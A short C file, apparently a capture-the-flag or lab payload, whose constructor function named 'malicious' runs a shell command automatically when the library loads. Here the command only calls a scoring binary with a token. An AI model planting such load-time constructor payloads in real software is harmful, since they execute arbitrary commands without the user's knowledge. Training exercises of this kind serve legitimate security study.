#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 56defbca-618d-4bbb-bf47-91ae75d4d871");
}
